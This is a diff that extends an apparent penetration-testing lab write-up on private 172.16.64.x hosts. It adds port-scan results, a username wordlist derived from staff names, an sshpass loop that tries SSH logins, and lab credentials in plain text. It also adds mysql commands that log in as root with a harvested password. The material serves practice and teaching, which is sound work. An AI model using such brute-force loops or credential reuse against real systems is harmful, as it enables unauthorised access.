@@ -18,7 +18,7 @@ sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
 
 | Host | OS |
 | :--- | :--- |
-| 172.16.64.81 | Linux |
+| 172.16.64.81 \(cms.foocorp.io, static.foocorp.io\) | Linux |
 | 172.16.64.91 | Linux |
 | 172.16.64.92 | Linux |
 | 172.16.64.166 | Linux |
@@ -31,7 +31,7 @@ sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
 | :--- | :--- | :--- |
 | 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
 | 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
-| 3306 | mysql | MySQL 5.7.25-0ubuntu0.16.04.2 |
+| 13306 | mysql | MySQL 5.7.25-0ubuntu0.16.04.2 |
 
 ### 172.16.64.91
 
@@ -58,7 +58,116 @@ sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
 
 ## Machines
 
+### 172.16.64.166
+
+![](../.gitbook/assets/image%20%285%29.png)
+
+```text
+elizabeth 
+Lopez
+elizabethlopez
+elopez
+managingdirector
+director
+manager  
+tara
+baker
+tarabaker
+tbaker
+designer
+beckycasey
+becky
+casey
+bcasey
+project
+manager 
+projectmanager
+randy
+carlson
+randycarlson
+rcarlson
+developer
+pabloroberts
+pablo
+roberts
+proberts
+founder
+bessiehammond
+bessie
+hammond
+bhammond
+programmer 
+gerardomalone
+gerardo
+malone
+gmalone
+juniordesigner
+junior
+designer
+sabrina 
+summers
+sabrinasummers
+ssummers
+analyst
+```
+
+```bash
+#!/bin/sh
+
+for user in $(cat users.txt); 
+do
+    echo "Trying '$user'..."
+    sshpass -p CHANGEME ssh -p 2222 $user@172.16.64.166 2>/dev/null
+    if [ $? -eq 0 ]; then
+        exit
+    fi
+done;
+```
+
+```bash
+sabrina@xubuntu:~$ cat flag.txt 
+Congratulations! You have successfully exploited this machine.
+Go for the others now.
+```
+
+```text
+sabrina@xubuntu:~$ cat hosts.bak 
+127.0.0.1       localhost
+172.16.64.81    cms.foocorp.io
+172.16.64.81    static.foocorp.io
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
 ### 172.16.64.81
 
+![](../.gitbook/assets/image%20%286%29.png)
 
+```text
+john1john1:password123
+peter:youdonotguessthatone5
+```
+
+### 172.16.64.92
+
+```text
+X-DB-Key: x41x41x412019!
+X-DB-User: root
+X-DB-name: mysql
+```
+
+![](../.gitbook/assets/image%20%284%29.png)
+
+```bash
+# Tried:
+# mysql --host=172.16.64.92 --user=root --password=x41x41x412019! --port 63306 mysql
+# Working:
+
+mysql --host=172.16.64.81 --user=root --password=x41x41x412019! --port 13306 mysql
+```
 
